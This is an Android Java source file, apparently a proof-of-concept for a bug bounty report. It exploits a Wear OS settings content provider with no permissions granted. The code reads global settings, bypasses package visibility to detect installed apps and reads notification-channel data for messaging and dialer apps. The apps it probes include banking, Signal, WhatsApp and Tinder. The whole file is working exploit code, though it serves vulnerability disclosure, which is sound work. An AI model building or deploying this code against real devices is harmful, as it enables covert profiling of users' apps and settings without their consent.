package com.vrp.poc;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;

public class WearSettingsLeakActivity extends Activity {
    private static final String TAG = "VRP_WEARSET";
    private static final String AUTHORITY = "com.google.android.wearable.settings";
    private static final Uri BASE_URI = Uri.parse("content://" + AUTHORITY);

    private static final String[] PROBE_PACKAGES = {
        "com.google.android.gm",
        "com.google.android.apps.messaging",
        "com.google.android.dialer",
        "com.google.android.calendar",
        "com.google.android.contacts",
        "com.google.android.keep",
        "com.google.android.apps.maps",
        "com.google.android.apps.photos",
        "com.google.android.apps.youtube.music",
        "com.google.android.apps.safetyhub",
        "com.google.android.wearable.assistant",
        "com.google.android.apps.walletnfcrel",
        "com.google.android.apps.fitness",
        "com.chase.sig.android",
        "com.paypal.android.p2pmobile",
        "com.whatsapp",
        "org.thoughtcrime.securesms",
        "com.tinder",
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        final TextView tv = new TextView(this);
        tv.setPadding(16, 16, 16, 16);
        tv.setTextSize(10f);
        sv.addView(tv);
        setContentView(sv);

        new Thread(() -> {
            StringBuilder sb = new StringBuilder();
            sb.append("=== Wearable SettingsProvider Zero-Permission Leak ===\n");
            sb.append("PoC app UID: ").append(android.os.Process.myUid()).append("\n\n");

            readGlobalSettings(sb);
            sb.append("\n");
            enumerateInstalledApps(sb);
            sb.append("\n");
            readNotificationChannels(sb);

            final String result = sb.toString();
            Log.i(TAG, result);
            runOnUiThread(() -> tv.setText(result));
        }).start();
    }

    private void readGlobalSettings(StringBuilder sb) {
        sb.append("--- GLOBAL SETTINGS (zero-permission read) ---\n");
        ContentResolver cr = getContentResolver();

        try {
            Cursor c = cr.query(Uri.parse("content://" + AUTHORITY + "/play_store_availability"),
                    null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String key = c.getString(0);
                    String val = c.getString(1);
                    sb.append("  ").append(key).append(" = ").append(val).append("\n");
                    Log.i(TAG, "SETTING: " + key + " = " + val);
                }
                c.close();
            }
        } catch (Exception e) {
            sb.append("  play_store_availability: ERROR ").append(e.getMessage()).append("\n");
        }

        try {
            Cursor c = cr.query(Uri.parse("content://" + AUTHORITY + "/bluetooth"),
                    null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String key = c.getString(0);
                    String val = c.getString(1);
                    sb.append("  ").append(key).append(" = ").append(val).append("\n");
                    Log.i(TAG, "SETTING: " + key + " = " + val);
                }
                c.close();
            }
        } catch (Exception e) {
            sb.append("  bluetooth: ERROR ").append(e.getMessage()).append("\n");
        }
    }

    private void enumerateInstalledApps(StringBuilder sb) {
        sb.append("--- APP ENUMERATION (bypasses package visibility) ---\n");
        ContentResolver cr = getContentResolver();
        int installed = 0;
        int notInstalled = 0;

        for (String pkg : PROBE_PACKAGES) {
            try {
                Bundle extras = new Bundle();
                extras.putString("channel_q_package", pkg);
                Cursor c = cr.query(
                        Uri.parse("content://" + AUTHORITY + "/notification_channels"),
                        null, extras, null);
                if (c != null && c.getCount() > 0) {
                    sb.append("  INSTALLED: ").append(pkg)
                      .append(" (").append(c.getCount()).append(" channels)\n");
                    Log.i(TAG, "INSTALLED: " + pkg + " (" + c.getCount() + " channels)");
                    installed++;
                    c.close();
                } else {
                    sb.append("  NOT INSTALLED: ").append(pkg).append("\n");
                    Log.i(TAG, "NOT_INSTALLED: " + pkg);
                    notInstalled++;
                    if (c != null) c.close();
                }
            } catch (Exception e) {
                sb.append("  NOT INSTALLED: ").append(pkg).append(" (").append(e.getMessage()).append(")\n");
                Log.i(TAG, "NOT_INSTALLED: " + pkg + " (" + e.getMessage() + ")");
                notInstalled++;
            }
        }
        sb.append("  Total: ").append(installed).append(" installed, ")
          .append(notInstalled).append(" not installed\n");
    }

    private void readNotificationChannels(StringBuilder sb) {
        sb.append("--- NOTIFICATION CHANNEL DETAILS ---\n");
        ContentResolver cr = getContentResolver();

        String[] detailApps = {"com.google.android.apps.messaging", "com.google.android.dialer"};
        for (String pkg : detailApps) {
            try {
                Bundle extras = new Bundle();
                extras.putString("channel_q_package", pkg);
                Cursor c = cr.query(
                        Uri.parse("content://" + AUTHORITY + "/notification_channels"),
                        null, extras, null);
                if (c != null) {
                    sb.append("  ").append(pkg).append(":\n");
                    int idx = 0;
                    while (c.moveToNext()) {
                        String group = c.getString(0);
                        byte[] blob = c.getBlob(1);
                        sb.append("    Channel ").append(idx)
                          .append(": group='").append(group != null ? group : "")
                          .append("', data_size=").append(blob != null ? blob.length : 0)
                          .append(" bytes\n");
                        Log.i(TAG, "CHANNEL: " + pkg + " #" + idx
                                + " group=" + group + " size=" + (blob != null ? blob.length : 0));
                        idx++;
                    }
                    c.close();
                }
            } catch (Exception e) {
                sb.append("  ").append(pkg).append(": ERROR ").append(e.getMessage()).append("\n");
            }
        }
    }
}
